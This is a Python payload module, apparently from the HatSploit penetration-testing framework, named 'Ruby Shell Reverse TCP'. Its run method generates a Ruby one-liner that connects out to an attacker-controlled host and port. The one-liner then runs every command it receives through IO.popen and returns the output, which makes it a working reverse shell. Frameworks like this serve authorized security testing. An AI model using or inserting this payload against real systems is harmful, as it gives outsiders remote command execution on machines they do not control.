"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.payload.basic import *


class HatSploitPayload(Payload, Handler):
    def __init__(self):
        super().__init__()

        self.details.update({
            'Name': "Ruby Shell Reverse TCP",
            'Payload': "unix/generic/ruby_reverse_tcp",
            'Authors': [
                'Ivan Nikolsky (enty8080) - payload developer',
            ],
            'Description': "Ruby shell reverse TCP payload.",
            'Arch': ARCH_GENERIC,
            'Platform': OS_UNIX,
            'Rank': "high",
            'Type': "reverse_tcp",
        })

    def run(self):
        payload = (
                "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\""
                + self.rhost.value
                + "\",\""
                + self.rport.value
                + "\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
        )
        return payload
